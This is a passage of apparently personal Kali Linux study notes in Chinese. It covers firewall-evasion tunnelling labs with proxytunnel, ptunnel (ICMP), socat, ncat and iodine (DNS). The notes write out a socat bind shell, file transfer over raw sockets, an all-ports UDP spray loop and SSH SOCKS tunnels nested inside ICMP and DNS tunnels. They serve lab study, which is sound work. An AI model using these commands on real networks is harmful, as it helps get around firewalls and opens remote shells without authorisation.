<li>无法创建DNS隧道和ICMP隧道</li>
<li>侦听端口开在本地上，可以指定需要访问的资源，服务器</li>
</ul>
<p><img src="/images/kali/kali-notepad/proxytunnel.PNG" srcset="/img/loading.gif" alt="proxytunnel"></p>
<h4 id="2-实验-1–准备"><a href="#2-实验-1–准备" class="headerlink" title="2. 实验-1–准备"></a>2. 实验-1–准备</h4><ul>
<li>将外网资源映射为内网指定端口</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>bodhi（代理服务器）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/proxytunnel%E5%AE%9E%E9%AA%8C-1.PNG" srcset="/img/loading.gif" alt="proxytunnel实验-1"></p>
<h4 id="3-实验-1"><a href="#3-实验-1" class="headerlink" title="3. 实验-1"></a>3. 实验-1</h4><ul>
<li>bodhi（代理服务器）<ul>
<li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
<li>暂时开启mono防火墙默认规则，方便下squid3和proxytunnel</li>
<li><strong><code>🔺命令：sudo apt-get install squid3</code></strong>（默认所有IP监听3128端口）</li>
<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong> ▲ 修改侦听IP，防止公网连接<ul>
<li>/^http_port → 内网IP:3128</li>
<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
<li>/^acl → 查看安全策略</li>
</ul>
</li>
<li><strong><code>🔺命令：sudo squid3 -k kill</code></strong>（会自动重启）</li>
<li><strong><code>🔺命令：netstat -pantu | grep 3128</code></strong>（查看是否限制为监听内网的3128端口）</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li><strong><code>🔺命令：sudo apt-get install proxytunnel</code></strong></li>
</ul>
</li>
<li>bodhi（代理服务器）<ul>
<li>关闭mono防火墙默认规则</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li>在无代理的情况下访问外网资源尝试</li>
<li>设置HTTP proxy → 代理服务器IP:3128，进行访问外网资源尝试</li>
</ul>
</li>
<li>Kali<ul>
<li>开启Web服务</li>
<li>启动Wireshark抓包</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li>访问Kali的Web服务进行尝试</li>
</ul>
</li>
<li>Kali<ul>
<li>查看抓包的数据分析（TCP Stream → Via/X-Fowarded-For会泄露真实IP以及代理IP）</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li>关闭代理端口</li>
<li><strong><code>🔺命令：proxytunnle -a（监听端口）80 -p 代理服务器IP:3128 -d Kali的IP:80</code></strong></li>
<li>浏览器访问http:127.0.0.1:80进行尝试</li>
</ul>
</li>
</ul>
<h4 id="4-实验-2–准备"><a href="#4-实验-2–准备" class="headerlink" title="4. 实验-2–准备"></a>4. 实验-2–准备</h4><ul>
<li>外网资源非防火墙允许端口</li>
<li>修改目标资源侦听端口可能无法躲避防火墙深层检测（协议检测可发现非80HTTP流量）</li>
<li>外网安装squid3代理服务器并侦听80端口</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>bodhi（代理服务器）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
<li>Kali（代理服务器+目标资源）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/proxytunnel%E5%AE%9E%E9%AA%8C-2.PNG" srcset="/img/loading.gif" alt="proxytunnel实验-2"></p>
<h4 id="5-实验-2"><a href="#5-实验-2" class="headerlink" title="5. 实验-2"></a>5. 实验-2</h4><ul>
<li>bodhi（代理服务器）<ul>
<li>浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -&gt; WAN HTTP</li>
<li>暂时开启mono防火墙默认规则，方便下squid3和proxytunnel</li>
<li><strong><code>🔺命令：sudo apt-get install squid3</code></strong>（默认所有IP监听3128端口）</li>
<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong> ▲ 修改侦听IP，防止公网连接<ul>
<li>/^http_port → 内网IP:3128</li>
<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
<li>/^acl → 查看安全策略</li>
</ul>
</li>
<li><strong><code>🔺命令：sudo squid3 -k kill</code></strong>（会自动重启）</li>
<li><strong><code>🔺命令：netstat -pantu | grep 3128</code></strong>（查看是否限制为监听内网的3128端口）</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li><strong><code>🔺命令：sudo apt-get install proxytunnel</code></strong></li>
</ul>
</li>
<li>bodhi（代理服务器）<ul>
<li>关闭mono防火墙默认规则</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li>在无代理的情况下访问外网资源尝试</li>
<li>设置HTTP proxy → 代理服务器IP:3128，进行访问外网资源尝试</li>
</ul>
</li>
<li>Kali（代理服务器+目标资源）<ul>
<li>关闭apache服务</li>
<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
<li><strong><code>🔺命令：vi /etc/squid3/squid.conf</code></strong><ul>
<li>/^http_port → 本机IP:80</li>
<li>/^http_access → 修改deny为allow（ports/ssl/all等）</li>
<li>/^acl → 查看安全策略</li>
</ul>
</li>
<li><strong><code>🔺命令：service squid3 start</code></strong>（netstat -pantu查看）</li>
<li>开启SSH服务（修改SSH配置文件，netstat -pantu查看）</li>
<li>开启Wireshark抓包（主要抓取888）</li>
</ul>
</li>
<li>PC（bodhi克隆）<ul>
<li><strong><code>🔺命令：proxytunnle -a 2222 -p 代理服务器IP:3128 -r Kali的IP:80 -d Kali的IP:22</code></strong></li>
<li><strong><code>🔺命令：ssh root@127.0.0.1 -p 2222</code></strong>进行连接尝试（密钥交换、输入密码 → ifconfig）</li>
<li><strong><code>🔺命令：proxytunnle -a 888 -p 代理服务器IP:3128 -r Kali的IP:80 -d 192.168.0.1:80</code></strong></li>
<li>浏览器访问127.0.0.1:888</li>
</ul>
</li>
<li>Kali<ul>
<li>▲ Wireshark抓包可看出，TCP Stream（tcp.stream eq 0）→ 方法为CONNECT</li>
</ul>
</li>
<li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH和HTTP都无法访问，数据包显示为Method Not Allowed方法不允许</li>
</ul>
<p><img src="/images/kali/kali-notepad/CONNECT.PNG" srcset="/img/loading.gif" alt="CONNECT数据包"></p>
<h4 id="6-实验-3"><a href="#6-实验-3" class="headerlink" title="6. 实验-3"></a>6. 实验-3</h4><ul>
<li>ssh客户端配置自动创建代理链隧道</li>
<li>PC（bodhi克隆）<ul>
<li><strong><code>🔺命令：sudo vi ~/.ssh/config</code></strong><ul>
<li>Host Kali的IP </li>
<li>Hostname Kali的IP</li>
<li>ProtocolKeepAlives 30 </li>
<li>ProxyCommand /usr/bin/proxytunnel \</li>
<li>-p 代理服务器IP:3128 \</li>
<li>-r Kali的IP:80 -d %h:%p</li>
</ul>
</li>
<li><strong><code>🔺命令：ssh root@Kali的IP -p 22</code></strong></li>
</ul>
</li>
<li>▲ 2020.2.3数据包能抓到CONNECT的流量，但建立的SSH无法访问，数据包显示为Method Not Allowed方法不允许</li>
</ul>
<p>![Method Not Allow](/images/kali/kali-notepad/Method Not Allow.PNG)</p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十三)：ICMP隧道--ptunnel</title>
    <url>/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%89)%EF%BC%9AICMP%E9%9A%A7%E9%81%93--ptunnel/</url>
    <content><![CDATA[<hr>
<h4 id="1-ptunnle"><a href="#1-ptunnle" class="headerlink" title="1. ptunnle"></a>1. ptunnle</h4><ul>
<li>Ping tunnel ICMP隧道工具<ul>
<li>通过ICMP echo（ping requests，8）和reply（ping reply，0）实现隧道</li>
<li>适用于防火墙只允许ping出站流量的环境</li>
<li>支持多并发连接、性能优</li>
<li>支持身份验证</li>
<li>需要root权限</li>
<li>支持抓包<ul>
<li>Win：winpcap</li>
<li>Linux：libpcap</li>
</ul>
</li>
<li>工作过程（指定Proxy的时候，需要指定目的地，客户端指定）<ul>
<li>Proxy、Client、Destination</li>
</ul>
</li>
</ul>
</li>
<li>服务器<ul>
<li><strong><code>🔺命令：ptunnel -x 1234</code></strong>  </li>
</ul>
</li>
<li>客户端<ul>
<li><strong><code>🔺命令：sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234</code></strong>  </li>
</ul>
</li>
<li>嵌套SSH隧道<ul>
<li><strong><code>🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></strong>  </li>
</ul>
</li>
<li>▲ ptunnel直到目前的最新版仍存在拒绝服务漏洞<ul>
<li>0.72</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/ptunnle.PNG" srcset="/img/loading.gif" alt="ptunnel工作过程"></p>
<h4 id="2-实验环境准备"><a href="#2-实验环境准备" class="headerlink" title="2. 实验环境准备"></a>2. 实验环境准备</h4><ul>
<li>Kali（Proxy&amp;Destinatiom）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>Kali（内网）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
<li>浏览器访问mono，检查防火墙规则<ul>
<li>Protocol → ICMP</li>
<li>Sourece → LAN subnet</li>
<li>LAN DNS -&gt; WAM PING</li>
</ul>
</li>
<li>ping/上网尝试</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
<li>Kali（Proxy&amp;Destinatiom）<ul>
<li>服务器：<strong><code>🔺命令：ptunnel -x 1234</code></strong> </li>
<li>启动Wireshark抓包，查看发送的数据包内容（ICMP数据包）</li>
</ul>
</li>
<li>Kali（内网）<ul>
<li><strong><code>🔺命令：sudo ptunnel -h</code></strong> </li>
<li>客户端：<strong><code>🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da 192.168.0.1 -dp 80 -x 1234</code></strong>  </li>
<li>浏览器访问127.0.0.1:2222进行尝试</li>
</ul>
</li>
<li>Kali（Proxy&amp;Destinatiom）<ul>
<li>开启SSH（修改SSH配置文件）</li>
</ul>
</li>
<li>Kali（内网）<ul>
<li><strong><code>🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da Kali的IP -dp 22 -x 1234</code></strong> </li>
<li><strong><code>🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></strong> </li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>设置浏览器Internet代理，用内网Kali的IP:7000，上网尝试</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十二)：隧道传输工具--SOCAT</title>
    <url>/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7--SOCAT/</url>
    <content><![CDATA[<hr>
<h4 id="1-SOCAT"><a href="#1-SOCAT" class="headerlink" title="1. SOCAT"></a>1. SOCAT</h4><ul>
<li>被称为nc++（增强版的nc）<ul>
<li>双向数据流通道工具</li>
</ul>
</li>
<li>连接端口<ul>
<li><strong><code>🔺命令：socat -（标准的输入输出） tcp:1.1.1.1:80（需要连接的目标）</code></strong></li>
</ul>
</li>
<li>侦听端口<ul>
<li><strong><code>🔺命令：socat - tcp4-listen:22 / socat - tcp-l:33</code></strong></li>
</ul>
</li>
<li>接受文件<ul>
<li><strong><code>🔺命令：socat tcp4-listen:333 open:2.txt,creat,append</code></strong></li>
</ul>
</li>
<li>发送文件<ul>
<li><strong><code>🔺命令：cat 1.txt | socat - tcp4:1.1.1.1:333</code></strong></li>
</ul>
</li>
<li>远程shell–服务器端<ul>
<li><strong><code>🔺命令：socat tcp-l:23 exec:sh,pty,stderr</code></strong> </li>
</ul>
</li>
<li>端口转发<ul>
<li><strong><code>🔺命令：socat tcp4-listen:22,fork tcp4:1.1.1.1:22</code></strong> </li>
</ul>
</li>
<li>远程执行命令<ul>
<li>服务器：<strong><code>🔺命令：socat - udp-l:2001</code></strong></li>
<li>客户端：<strong><code>🔺命令：&quot;</code>id<code>&quot; | socat - udp4-datagram:1.1.1.1:2001</code></strong></li>
</ul>
</li>
<li>UDP全端口任意内容发包<ul>
<li><strong><code>🔺命令：for PORT in {1..65535}; do echo “aaaaa&quot; | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done</code></strong></li>
</ul>
</li>
<li>二进制编辑器<ul>
<li><strong><code>🔺命令：echo -e &quot;\0\14\0\0\c&quot; | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420</code></strong></li>
</ul>
</li>
<li>简单的WEB服务<ul>
<li><strong><code>🔺命令：socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;</code></strong></li>
</ul>
</li>
</ul>
<h4 id="2-实验环境准备"><a href="#2-实验环境准备" class="headerlink" title="2. 实验环境准备"></a>2. 实验环境准备</h4><ul>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>bodhi<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-TCP连接-侦听端口"><a href="#3-TCP连接-侦听端口" class="headerlink" title="3. TCP连接/侦听端口"></a>3. TCP连接/侦听端口</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：socat - tcp:192.168.0.1:80</code></strong></li>
<li><strong><code>🔺命令：get / http 1.1/</code></strong></li>
<li><strong><code>🔺命令：head</code></strong></li>
<li>侦听端口：<strong><code>🔺命令：socat - tcp4-listen:2222</code></strong>（作为服务器端使用）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：apt-get install socat</code></strong></li>
<li><strong><code>🔺命令：socat - tcp:Kali的IP:2222</code></strong></li>
<li>进行传输数据测试</li>
</ul>
</li>
</ul>
<h4 id="4-TCP传送-接收文件"><a href="#4-TCP传送-接收文件" class="headerlink" title="4. TCP传送/接收文件"></a>4. TCP传送/接收文件</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：socat tcp4-listen:333 open:2.txt,creat,append</code></strong>（接收文件）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：echo &quot;asdasdsafasfs&quot; &gt; 1.txt</code></strong></li>
<li><strong><code>🔺命令：cat 1.txt | socat - tcp4:Kali的IP:333</code></strong>（发送文件）</li>
</ul>
</li>
</ul>
<h4 id="5-TCP远程Shell–服务器端"><a href="#5-TCP远程Shell–服务器端" class="headerlink" title="5. TCP远程Shell–服务器端"></a>5. TCP远程Shell–服务器端</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：socat tcp-l:23 exec:sh（shell）,pty（终端）,stderr（标准输入输出）</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：socat - tcp:Kali的IP:23</code></strong></li>
<li><strong><code>🔺命令：id/ifconfig进行测试</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-TCP端口转发"><a href="#6-TCP端口转发" class="headerlink" title="6. TCP端口转发"></a>6. TCP端口转发</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：socat tcp4-listen:8080,fork tcp4:192.168.0.1:80</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li>浏览器访问Kali的IP:8080</li>
</ul>
</li>
</ul>
<h4 id="7-UDP远程执行命令"><a href="#7-UDP远程执行命令" class="headerlink" title="7. UDP远程执行命令"></a>7. UDP远程执行命令</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：socat - udp-l:2000</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：echo &quot;</code>id<code>&quot;&quot; | socat - udp4-datagram:Kali的IP:2000</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="8-UDP全端口任意内容发包（类似全端口扫描）"><a href="#8-UDP全端口任意内容发包（类似全端口扫描）" class="headerlink" title="8. UDP全端口任意内容发包（类似全端口扫描）"></a>8. UDP全端口任意内容发包（类似全端口扫描）</h4><ul>
<li>Kali<ul>
<li>Wireshark抓包，过滤UDP数据包</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：for PORT in {1..65535}; do echo &quot;aaaaa&quot; | socat - UDP4-DATAGRAM: Kali的IP地址:$PORT; sleep .1; done</code></strong></li>
</ul>
</li>
<li>▲ 2020.2.2 发送的数据包应用层为ADwin configuration protocol，也为运输层UDP包</li>
</ul>
<h4 id="9-二进制编辑器"><a href="#9-二进制编辑器" class="headerlink" title="9. 二进制编辑器"></a>9. 二进制编辑器</h4><ul>
<li><strong><code>🔺命令：echo -e（使用二进制） &quot;\0\14\0\0\c&quot; | socat -u（单向数据传输） -file:/usr/bin/ squid.exe,seek,seek=0x00074420（偏移量）</code></strong> </li>
<li>▲ 2020.2.2 未实验，此段代码为一个翻墙软件在Window平台正常启动所需代码，需进行偏移</li>
</ul>
<h4 id="10-TCP简单的WEB服务器"><a href="#10-TCP简单的WEB服务器" class="headerlink" title="10. TCP简单的WEB服务器"></a>10. TCP简单的WEB服务器</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\ \&quot;HTTP/1.0 200 OK\\\nDocumentType: text/plain\\\n\\\ndate: \$\(date\)\\ \nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \ $SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\ \\&quot;\&quot;&quot;&quot;</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li>浏览器访问Kali的IP:10081</li>
<li>字符界面：<strong><code>🔺命令：socat - tcp:Kali的IP:10081</code></strong></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十一)：隧道传输工具--NCAT</title>
    <url>/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%80)%EF%BC%9A%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7--NCAT/</url>
    <content><![CDATA[<hr>
<h4 id="1-NCAT"><a href="#1-NCAT" class="headerlink" title="1. NCAT"></a>1. NCAT</h4><ul>
<li>被称为众多NC衍生版软件中最优的选择</li>
<li>代理功能（如果不指定端口，默认为31337）<ul>
<li><strong><code>🔺命令：ncat -l 8080 --proxy-type http --proxy-auth user:pass</code></strong></li>
<li>浏览器设置代理服务器127.0.0.1:31337，进行网页访问</li>
</ul>
</li>
<li>Broke中介功能<ul>
<li>AB不同但AC、BC互通</li>
<li>服务器：<strong><code>🔺命令：ncat -l 333 --broke</code></strong></li>
<li>客户端之间：发送任何信息都会被hub到其他客户端</li>
<li>批量执行命令：<strong><code>🔺命令：ncat 1.1.1.1 --sh-exec &quot;echo</code>pwd<code>&quot;</code></strong></li>
<li>批量传文件：<strong><code>🔺命令：ncat --send-only 1.1.1.1 &lt; inputfile</code></strong></li>
</ul>
</li>
<li>实验（Kail上的三个终端窗口进行模拟）<ul>
<li>1：<strong><code>🔺命令：ncat -l 333 --broke</code></strong></li>
<li>2/3：<strong><code>🔺命令：ncat localhost 333</code></strong></li>
<li>2：<strong><code>🔺命令：aaa</code></strong> → 3收得到信息</li>
<li>3：<strong><code>🔺命令：bbb</code></strong> → 2收得到信息</li>
<li>2：<strong><code>🔺命令：ncat 127.0.0.1 333 --sh-exec &quot;echo</code>pwd<code>&quot; → 3</code></strong>进行pwd系统指令操作</li>
<li>3：<strong><code>🔺命令：ncat --send-only 127.0.0.1 333 &lt; a.php</code></strong> → 2收到a.php文件</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(七十)：DNS隧道--iodine</title>
    <url>/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--iodine/</url>
    <content><![CDATA[<hr>
<h4 id="1-DNS协议隧道–iodine"><a href="#1-DNS协议隧道–iodine" class="headerlink" title="1. DNS协议隧道–iodine"></a>1. DNS协议隧道–iodine</h4><ul>
<li>基于DNS查询的隧道工具</li>
<li>与同类工具相比的优点<ul>
<li>对下行数据不进行编码，因此性能优</li>
<li>支持多平台：Linux、BSD、Mac OS、Windows</li>
<li>最大16个并发连接</li>
<li>强制密码支持</li>
<li>支持同网段隧道IP（不同于服务器、客户端网段）</li>
<li>支持多种DNS记录类型（自动协商使用的DNS记录类型）</li>
<li>丰富的隧道质量检测措施</li>
</ul>
</li>
</ul>
<h4 id="2-实验环境（Linux）"><a href="#2-实验环境（Linux）" class="headerlink" title="2. 实验环境（Linux）"></a>2. 实验环境（Linux）</h4><ul>
<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window Server 2003（外网的DNS服务器）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
<li>安装DNS服务器<ul>
<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）   </li>
<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
<li>主要区域、区域名称（lab.com）</li>
</ul>
</li>
<li>NS记录指向Kali<ul>
<li>右键lab.com空白区域 → 新建主机 → 名称（w2k3）、IP（2003的IP地址）</li>
<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
</ul>
</li>
<li>创建区域lab.com，指派二级域test.lab.com<ul>
<li>lab.com → 右键 → 新建委派 → test → 添加（kali的主机记录）→ 解析</li>
<li><strong><code>🔺命令：ping kali.lab.com</code></strong>查看是否能进行正常通信</li>
</ul>
</li>
<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
<li>nslookup解析新浪和百度的域名，查看是否能正常通信</li>
</ul>
</li>
</ul>
</li>
<li>Kali<ul>
<li>安装squid<ul>
<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>bodhi<ul>
<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
<li>查看网管（netstat -nr，看是否为mono网关）</li>
<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
</ul>
</li>
<li>Window Server 2003（内网的DNS服务器）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
<li>安装DNS服务器<ul>
<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
<li>主要区域、区域名称（lab.com）</li>
</ul>
</li>
<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
<li>服务器图标 → 右键 → 属性 → 转发 → 外网的DNS服务器（Window Server 2003）</li>
</ul>
</li>
<li>登陆防火墙查看规则（源和目的：Single host or alias，设置目的IP为Window Server 2003的IP地址）</li>
<li>nslookup解析lab.com、test.lab.com、新浪、百度的域名，查看是否能正常通信</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：service squid start</code></strong></li>
<li>开启SSH服务（擦除以前所作操作）</li>
<li><strong><code>🔺命令：netstat -pantu</code></strong>（查看3128端口和22端口是否开放）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为内网Window Server 2003的IP地址</li>
<li><strong><code>🔺命令：dig -t ns lab.com</code></strong>（查看是否解析到w2k3.lab.com以及IP地址）</li>
<li><strong><code>🔺命令：dig -t ns test.lab.com</code></strong>（查看是否正常解析）</li>
<li>▲ 2020.2.1 dig无法正常解析，但nslookup可以正常解析，最后也能正常上网</li>
</ul>
</li>
<li>Kali<ul>
<li>运行服务器端：<strong><code>🔺命令：iodined -f -c 10.0.0.1（服务器隧道IP） test.lab.com</code></strong> <ul>
<li>-f 前端显示（可选）</li>
<li>-c 不检查客户端IP</li>
<li>IP 服务器端隧道IP的地址</li>
</ul>
</li>
<li>▲ 需要设置密码才能建立隧道，ifconfig查看是否多出一个网卡</li>
</ul>
</li>
<li>bodhi<ul>
<li>通过修改网卡方式为Bridge，桥接网络，进行下载iodine</li>
<li>运行客户端：**`🔺命令：iodine -f test.lab.com（若指定IP，为局域网内DNS的IP地址）</li>
<li>▲ 需要输入密码才能建立隧道（需同服务器端密码相同），ifconfig查看是否多出一个网卡，进行ping 服务器端的IP地址看能否相同</li>
<li><strong><code>🔺命令：ssh root@10.0.0.1 -p 22</code></strong>进行尝试登陆，看能否能登陆成功</li>
<li>设置浏览器代理，SOCKS proxy → 10.0.0.1:3128，进行网络访问尝试 ▲ 2020.2.2 可抓取到数据包，但无法上网，Kali的3128监听连接都是IPv6</li>
<li><strong><code>🔺命令：ssh -CfNg -D 7001 root@10.0.0.1 -p 22</code></strong>进行嵌套SSH隧道</li>
<li>在内网的Window Server 2003上修改Internet选项，设置代理服务器socks Proxy代理，访问网络尝试</li>
</ul>
</li>
<li>隧道网络接口<ul>
<li>不基于资源的通用隧道，如同本网段内两台相邻的主机</li>
<li>服务器端和客户端生成隧道网络接口eth0</li>
<li>隧道两端接口的IP地址应不同于客户端和服务器端网段</li>
<li>基于此隧道可嵌套其他隧道技术</li>
</ul>
</li>
</ul>
<h4 id="2-实验环境（Windows）"><a href="#2-实验环境（Windows）" class="headerlink" title="2. 实验环境（Windows）"></a>2. 实验环境（Windows）</h4><ul>
<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window Server 2003（外网的DNS服务器）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
<li>安装DNS服务器<ul>
<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）   </li>
<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
<li>主要区域、区域名称（lab.com）</li>
</ul>
</li>
<li>NS记录指向Kali<ul>
<li>右键lab.com空白区域 → 新建主机 → 名称（w2k3）、IP（2003的IP地址）</li>
<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
</ul>
</li>
<li>创建区域lab.com，指派二级域test.lab.com<ul>
<li>lab.com → 右键 → 新建委派 → test → 添加（kali的主机记录）→ 解析</li>
<li><strong><code>🔺命令：ping kali.lab.com</code></strong>查看是否能进行正常通信</li>
</ul>
</li>
<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
<li>nslookup解析新浪和百度的域名，查看是否能正常通信</li>
</ul>
</li>
</ul>
</li>
<li>Kali<ul>
<li>安装squid<ul>
<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>Window Server 2003（内网的DNS服务器）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
